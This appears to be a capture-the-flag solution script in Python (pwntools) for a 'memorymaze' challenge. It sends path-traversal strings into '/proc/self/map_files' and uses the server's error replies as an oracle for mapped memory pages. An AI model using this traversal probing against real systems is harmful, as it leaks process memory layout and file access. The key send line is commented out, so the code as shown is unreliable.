import sys,os
from pwn import *
from shithead import *

r = remote('memorymaze.hackable.software',1337)

def inp():
	x = r.recvuntil('Your name:\n')
	sys.stdout.write(x)
	return x

queries = 0
def oracle(x,y):
	# optimizations
	if y == 0 or y == 302 or x == 0 or x == 302:
		return 0
	if y % 2 == 1:
		return 1
	print('query %d %d' % (x,y))
	global queries
	queries += 1

	addr = xy2addr(x,y)
	addr_end = addr + 0x1000
	lmao = '../proc/self/map_files/%08x-%08x' % (addr,addr_end)
	print(lmao)
	# r.sendline(lmao)
	resp = inp()
	if b'No such file or directory' in resp: # page not mapped. Not walkable
		return 0
	if b'Operation not permitted' in resp: # page mapped. Walkable
		return 1
	print(resp)
	raise ValueError('what the fuck?')

inp()
path = solve(oracle)
print('took %d queries' % queries)
print(path)
# print(path)

r.sendline('tohru')
r.sendline(str(len(path)))
r.sendline(path)

r.interactive()
